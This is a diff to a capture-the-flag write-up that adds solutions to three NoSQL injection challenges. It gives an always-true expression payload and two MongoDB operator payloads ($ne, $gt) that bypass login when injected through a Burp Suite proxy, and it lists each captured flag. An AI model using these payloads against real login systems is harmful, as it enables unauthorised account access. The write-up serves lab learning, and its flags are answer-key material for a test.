@@ -32,6 +32,20 @@ When this is entered in the "username" field, the rest of the query gets comment
 ![](images/3.png)
 
 
+## NoSQL challenges
 
+### Challenge 1 - - User Lookup  
++ Solution: ```"' || '2'=='2"``` (without double quotes)
++ Flag: ctf{c0ngr8$}
 
+### Challenge 2 - User Login  
+1. Direct payload wont work, need to install a proxy (I used burp suite)
+2. Need to change browser proxy settings in browser (I used FoxyProxy extension for Firefox)- set proxy IP to 127.0.0.1, port to 8080
+3. Login using any credentials
+4. Intercept the request and change the payload to: ```{"username":"admin","password":{"$ne": 1}}```
++ Flag: ctf{l0L+sO+r@nd0m}
 
+### Challenge 3 - User Login
+Follow steps 1-3 from above  
++ Intercept the request and change the payload to: ```{"username":{"$gt": ""},"password":{"$ne": 1}}```
++ Flag: ctf{y0uve_ch@ng3d}
